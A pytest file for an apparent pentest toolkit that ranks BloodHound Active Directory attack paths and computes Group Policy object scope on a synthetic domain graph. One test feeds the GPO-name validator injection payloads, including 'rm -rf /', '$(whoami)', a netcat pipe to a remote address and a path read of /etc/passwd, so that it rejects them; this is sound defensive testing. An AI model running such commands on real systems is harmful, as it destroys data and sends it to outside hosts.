"""
bh-quickwin: the shortestPath query has no relationship-type filter (Neo4j 4.4,
what BloodHound CE ships, can't exclude types from a variable-length pattern
without APOC - see the comment on _STRUCTURAL_EDGE_TYPES). So instead of trying
to mock a bolt session, these tests exercise gather()'s actual post-filter
against the real bug shape: a GPO-abuse chain that only reaches the target
Group through Contains, alongside a genuine MemberOf/GenericAll chain that
must still survive.

This is the live-graph bug from 2026-08-26 against SYSCO.LOCAL: owning
GREG.SHIELDS produced a reported 5-hop path to Domain Admins that was real for
its first four hops (MemberOf a group with WriteOwner on a GPO linked to the
domain root) and bogus for its last two (Contains, Contains) - containment
into an OU/domain doesn't make the Domain Admins group object itself
compromised just because it's filed there.
"""

from oscp_toolkit.bh_quickwin import _STRUCTURAL_EDGE_TYPES, _drop_structural_paths


def _row(source, target, node_names, edge_types, hops):
    return {
        "source": source,
        "target": target,
        "node_names": node_names,
        "edge_types": edge_types,
        "hops": hops,
    }


def test_structural_edge_types_are_contains_and_gplink():
    # Locks the set so a future edit can't silently narrow or widen it without
    # this test flagging the change.
    assert _STRUCTURAL_EDGE_TYPES == {"Contains", "GPLink"}


def test_drops_the_live_gpo_containment_false_positive():
    # The exact SYSCO.LOCAL shape: WriteOwner on a GPO is real, GPLink to the
    # domain root is real scope, but the last two Contains hops into an
    # unrelated Group are not control.
    bogus = _row(
        "GREG.SHIELDS@SYSCO.LOCAL", "DOMAIN ADMINS@SYSCO.LOCAL",
        ["GREG.SHIELDS", "GROUP POLICY CREATOR OWNERS", "DEFAULT DOMAIN POLICY",
         "SYSCO.LOCAL", "USERS", "DOMAIN ADMINS"],
        ["MemberOf", "WriteOwner", "GPLink", "Contains", "Contains"],
        5,
    )
    kept, dropped = _drop_structural_paths([bogus])
    assert kept == []
    assert dropped == 1


def test_keeps_a_genuine_control_only_chain():
    real = _row(
        "JACK.DOWLAND@SYSCO.LOCAL", "DOMAIN ADMINS@SYSCO.LOCAL",
        ["JACK.DOWLAND", "IT ADMINS", "DOMAIN ADMINS"],
        ["MemberOf", "AddMember"],
        2,
    )
    kept, dropped = _drop_structural_paths([real])
    assert kept == [real]
    assert dropped == 0


def test_mixed_batch_keeps_real_drops_bogus():
    real = _row("A@D", "DA@D", ["A", "DA"], ["AdminTo"], 1)
    bogus_mid = _row(
        "B@D", "DA@D", ["B", "SOMEGROUP", "OU", "DA"],
        ["MemberOf", "Contains", "Contains"], 3,
    )
    bogus_trailing_gplink = _row(
        "C@D", "DA@D", ["C", "GPO", "DA"], ["WriteOwner", "GPLink"], 2,
    )
    kept, dropped = _drop_structural_paths([real, bogus_mid, bogus_trailing_gplink])
    assert kept == [real]
    assert dropped == 2


def test_no_paths_is_a_noop():
    kept, dropped = _drop_structural_paths([])
    assert kept == []
    assert dropped == 0


def test_structural_edge_in_the_middle_is_still_rejected():
    # Not just the tail hop - Contains/GPLink anywhere in the chain invalidates
    # it, since a later real edge doesn't retroactively make the containment
    # hop meaningful.
    row = _row(
        "A@D", "DA@D", ["A", "OU", "GROUP", "DA"],
        ["Contains", "MemberOf", "AddMember"], 3,
    )
    kept, dropped = _drop_structural_paths([row])
    assert kept == []
    assert dropped == 1


# --- gpo-scope: the counterpart command ---------------------------------------
# `wins` deliberately refuses to walk Contains/GPLink, which is correct for "what
# did I compromise" and leaves "what does this GPO actually reach" unanswered.
# gpo-scope answers that second question with the same two edges. These tests run
# against _fake_bh_graph, a synthetic SYSCO.LOCAL-shaped graph whose fake client
# computes what each query is specified to return by really walking the graph.
# The literal Cypher is NOT executed here - no Neo4j in the build sandbox.

import io
import contextlib

import pytest

from oscp_toolkit import bh_quickwin as B
from ._fake_bh_graph import FakeClient


@pytest.fixture
def client():
    return FakeClient()


DDP = "DEFAULT DOMAIN POLICY@SYSCO.LOCAL"


def test_domain_linked_gpo_reaches_the_dc(client):
    scope = B.gather_gpo_scope(client, DDP)
    dcs = [r for r in scope.in_scope if r["is_dc"]]
    assert [r["name"] for r in dcs] == ["DC01@SYSCO.LOCAL"]
    assert any("runs as SYSTEM" in n for n in scope.notes)


def test_blocked_inheritance_cuts_an_object_out(client):
    scope = B.gather_gpo_scope(client, DDP)
    assert "WS01@SYSCO.LOCAL" not in [r["name"] for r in scope.in_scope]
    excluded = {r["name"]: r for r in scope.excluded}
    assert excluded["WS01@SYSCO.LOCAL"]["blocked_by"] == ["WORKSTATIONS@SYSCO.LOCAL"]


def test_enforced_link_beats_blocked_inheritance(client):
    scope = B.gather_gpo_scope(client, "ENFORCED POLICY@SYSCO.LOCAL")
    ws = [r for r in scope.in_scope if r["name"] == "WS01@SYSCO.LOCAL"]
    assert ws and ws[0]["enforced_over_block"] == ["WORKSTATIONS@SYSCO.LOCAL"]
    assert scope.excluded == []


def test_owned_member_of_a_controlling_group_is_surfaced(client):
    scope = B.gather_gpo_scope(client, DDP)
    ctl = [r for r in scope.controllers if r["edge"] == "WriteOwner"]
    assert ctl and ctl[0]["owned_members"] == ["GREG.SHIELDS@SYSCO.LOCAL"]
    # LAINEY is in the group but was never marked owned - don't imply we have her.
    assert "LAINEY.MOORE@SYSCO.LOCAL" in [m["name"] for m in ctl[0]["members"]]


def test_security_filtering_caveat_is_always_stated(client):
    # BloodHound doesn't collect it, so an in-scope object can still be filtered
    # out for real. Never let this table read as authoritative.
    scope = B.gather_gpo_scope(client, DDP)
    assert any("security filtering" in n for n in scope.notes)


def test_unlinked_gpo_reports_instead_of_crashing(client):
    scope = B.gather_gpo_scope(client, "ORPHAN POLICY@SYSCO.LOCAL")
    assert scope.in_scope == [] and scope.links == []
    assert any("No GPO named" in n for n in scope.notes)


def test_listing_mode_finds_controlled_gpos_without_walking_scope(client):
    scope = B.gather_gpo_scope(client, None)
    assert {r["gpo"] for r in scope.controllers} == {DDP, "ORPHAN POLICY@SYSCO.LOCAL"}
    assert scope.in_scope == [] and scope.links == []


def test_gpo_resolvable_by_objectid_guid(client):
    name = B.validate_gpo_name("{31B2F340-016D-11D2-945F-00C04FB984F9}")
    scope = B.gather_gpo_scope(client, name)
    assert "DC01@SYSCO.LOCAL" in [r["name"] for r in scope.in_scope]


@pytest.mark.parametrize("payload", [
    "; rm -rf /", "$(whoami)", "`id`", "&& reboot", "| nc 1.2.3.4 4444",
    "\nreboot", "') RETURN 1 //", "../../etc/passwd", "DEFAULT\x1b[2J POLICY",
])
def test_gpo_name_rejects_injection_payloads(payload):
    # $(whoami) and && reboot both passed the first version of this regex.
    with pytest.raises(B.ValidationError):
        B.validate_gpo_name(DDP + payload)


@pytest.mark.parametrize("name", ["Sales & Marketing", "Policy (2024)", "Bob's Policy"])
def test_gpo_names_needing_excluded_characters_are_rejected(name):
    # Documented cost of the tight allow-list: use the objectid GUID for these.
    with pytest.raises(B.ValidationError):
        B.validate_gpo_name(name)


def test_legitimate_gpo_names_survive():
    assert B.validate_gpo_name("Default Domain Policy@sysco.local") == DDP
    assert B.validate_gpo_name("{31B2F340-016D-11D2-945F-00C04FB984F9}")
    with pytest.raises(B.ValidationError):
        B.validate_gpo_name("---")


def test_no_escape_bytes_reach_piped_output(client, monkeypatch):
    from tests import _fake_bh_graph as FG
    monkeypatch.setitem(FG.NODES, "EVIL\x1b[2J@SYSCO.LOCAL", {"labels": ["Computer"]})
    FG.EDGES.append(("USERS@SYSCO.LOCAL", "Contains", "EVIL\x1b[2J@SYSCO.LOCAL", {}))
    try:
        scope = B.gather_gpo_scope(client, DDP)
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            B.render_gpo_scope_plain(scope)
        assert buf.getvalue().count("\x1b") == 0
    finally:
        FG.EDGES.pop()


def test_json_envelope_and_exit_codes(client, monkeypatch):
    scope = B.gather_gpo_scope(client, DDP)
    env = B.build_gpo_json(scope, "bolt://localhost:7687")
    assert env["subject"] == DDP
    assert "1 DC(s)" in env["summary"]

    monkeypatch.setattr(B.Neo4jClient, "connect",
                        staticmethod(lambda uri, user, pw: FakeClient()))

    class Args:
        command = "gpo-scope"
        uri = "bolt://localhost:7687"
        user = "neo4j"
        password = "x"
        json_out = None
        gpo_name = DDP

    with contextlib.redirect_stdout(io.StringIO()):
        assert B.run_command(Args()) == B.EXIT_OK
        Args.gpo_name = "NOSUCH POLICY@SYSCO.LOCAL"
        assert B.run_command(Args()) == B.EXIT_NO_DATA
